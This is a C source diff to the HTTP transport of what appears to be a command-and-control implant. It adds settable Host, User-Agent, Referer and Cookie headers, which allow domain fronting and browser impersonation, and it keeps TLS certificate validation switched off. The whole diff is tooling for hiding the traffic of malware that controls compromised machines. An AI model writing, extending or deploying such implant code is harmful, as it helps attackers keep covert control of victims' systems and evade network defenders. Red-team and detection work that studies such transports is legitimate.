@@ -121,6 +121,12 @@ void http_ctx_free(struct http_ctx *ctx)
 			buffer_queue_free(ctx->egress);
 		}
 		free(ctx->uri);
+		for (int i = 0; i < ctx->data.num_headers; i++) {
+			free(ctx->data.headers[i]);
+		}
+		free(ctx->data.ua);
+		free(ctx->data.referer);
+		free(ctx->data.cookie_list);
 		free(ctx);
 	}
 }
@@ -141,26 +147,38 @@ int http_transport_init(struct c2_transport *t)
 	ctx->data.content_type = "application/octet-stream";
 	ctx->opts.flags = HTTP_OPTS_SKIP_TLS_VALIDATION;
 
-	char *ua = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
+	ctx->data.num_headers = 1;
+	ctx->headers[0] = strdup("Connection: close");
+
 	char *args = strchr(ctx->uri, '|');
 	if (args) {
 		*args = '\0';
 		if (strlen(++args)) {
 			size_t argc = 0;
 			char **argv = argv_split(args, NULL, &argc);
-			for (size_t i = 0; i < argc; i++) {
-				if (strcmp(argv[i], "--ua") == 0 && argv[i + 1]) {
-					ua = argv[i + 1];
+			for (size_t i = 0; i + 1 < argc && argv[i + 1]; i += 2) {
+				if (strcmp(argv[i], "--host") == 0) {
+					if (asprintf(&ctx->headers[ctx->data.num_headers],
+						"Host: %s", argv[i + 1]) > 0) {
+						ctx->data.num_headers++;
+					}
+				}
+				if (strcmp(argv[i], "--ua") == 0) {
+					ctx->data.ua = strdup(argv[i + 1]);
+					log_info("ua: %s", ctx->data.ua);
+				}
+				if (strcmp(argv[i], "--referer") == 0) {
+					ctx->data.referer = strdup(argv[i + 1]);
+					log_info("referer: %s", ctx->data.referer);
+				}
+				if (strcmp(argv[i], "--cookie") == 0) {
+					ctx->data.cookie_list = strdup(argv[i + 1]);
+					log_info("cookie: %s", ctx->data.cookie_list);
 				}
 			}
 		}
 	}
 
-	ctx->data.num_headers = 1;
-	ctx->headers[0] = strdup("Connection: close");
-	if (asprintf(&ctx->headers[ctx->data.num_headers], "User-Agent: %s", ua) > 0) {
-		ctx->data.num_headers++;
-	}
 	ctx->data.headers = ctx->headers;
 
 	ctx->first_packet = 1;
